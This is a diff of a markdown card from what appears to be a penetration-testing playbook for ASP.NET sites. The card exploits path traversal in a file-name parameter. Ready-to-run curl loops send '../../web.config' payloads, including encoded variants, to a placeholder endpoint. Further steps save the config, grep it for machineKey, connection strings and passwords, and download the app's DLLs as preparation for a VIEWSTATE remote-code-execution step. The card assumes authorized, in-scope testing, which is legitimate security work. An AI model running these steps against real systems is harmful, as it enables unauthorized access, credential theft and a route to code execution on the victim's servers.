@@ -1,31 +1,54 @@
-# Batch 03 — LFI → web.config → DLLs
+# Batch 03 — Read files → web.config → DLLs
 
-## objective
+## GOAL
+If a parameter is a file name, climb out with `../` and grab config + app DLLs.
 
-Abuse path parameters (`fileName`, etc.) to read **`web.config`**, then **`bin/*.dll`**. Stop after files in loot — VIEWSTATE is next batch.
+## TIME
+~1 hour
 
-## estimated_time
+## YOU NEED
+- URL with file param (`fileName`, `file`, `path`, …)
+- File-read allowed in scope
 
-60–90 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Endpoint that takes a file path/name
-- Authorized file-read testing
+Bad C# often does:
 
-## testing_workflow
+```text
+open( folder + user_input )
+```
 
-### 1) Technique A — prove traversal
+If user_input is `../../web.config`, you leave the folder and read the app’s **settings file**.  
+`web.config` can hold:
+
+- database passwords  
+- **machineKey** (needed for VIEWSTATE RCE next card)  
+- names of DLLs in `bin/`
+
+DLLs = compiled app code you can reverse later.
+
+---
+
+## DO THIS
 
 ```bash
+# CHANGE to real endpoint
 BASE="https://TARGET/v1/DownloadCategoryExcel"
+```
+
+### 1) Prove `../` works
+
+```bash
 for p in '../../web.config' '..%2f..%2fweb.config' '..\..\web.config'; do
-  curl -sk -G "$BASE" --data-urlencode "fileName=$p" -D- -o /tmp/out | head -15
-  file /tmp/out; head -c 200 /tmp/out; echo
+  echo "=== $p ==="
+  curl -sk -G "$BASE" --data-urlencode "fileName=$p" -D- -o /tmp/out | head -12
+  file /tmp/out; head -c 180 /tmp/out; echo
 done
 ```
 
-### 2) Technique B — gold files
+### 2) Save gold files
 
 ```bash
 curl -sk -G "$BASE" --data-urlencode "fileName=../../web.config" -o web.config
@@ -33,28 +56,34 @@ curl -sk -G "$BASE" --data-urlencode "fileName=../../global.asax" -o global.asax
 grep -iE 'machineKey|connectionString|password' web.config
 ```
 
-### 3) Technique C — pull DLLs named in config
+### 3) Pull DLLs named in config
 
 ```bash
-# From namespaces / assembly names in web.config
+# change Company.Web.Api.dll to a name you saw
 curl -sk -G "$BASE" --data-urlencode "fileName=../../bin/Company.Web.Api.dll" \
   -o Company.Web.Api.dll
 file Company.Web.Api.dll
 ```
 
-## decision_points
+### 4) Write down
 
-| If… | Then… |
-|-----|--------|
-| machineKey present | → **04** |
+```text
+LFI: yes/no
+machineKey: yes/no
+DLLs saved:
+```
+
+---
+
+## IF / THEN
+
+| What you saw | What you do |
+|--------------|-------------|
+| machineKey lines | → **04** |
 | DLLs only | → **05** |
-| No LFI | → **06** if XML; **07** shortnames; **05** if vendor paths |
+| No LFI | → **06** if XML, **07** shortnames, **05** if vendor paths |
 
-## expected_findings
+---
 
-- Config secrets, machine keys, application binaries
-
-## next_batch_to_continue_with
-
-→ **[04-viewstate-rce.md](./04-viewstate-rce.md)** if keys  
-else → **[05-dnspy-dependencies.md](./05-dnspy-dependencies.md)**
+## NEXT
+→ [04-viewstate-rce.md](./04-viewstate-rce.md) or [05-dnspy-dependencies.md](./05-dnspy-dependencies.md)
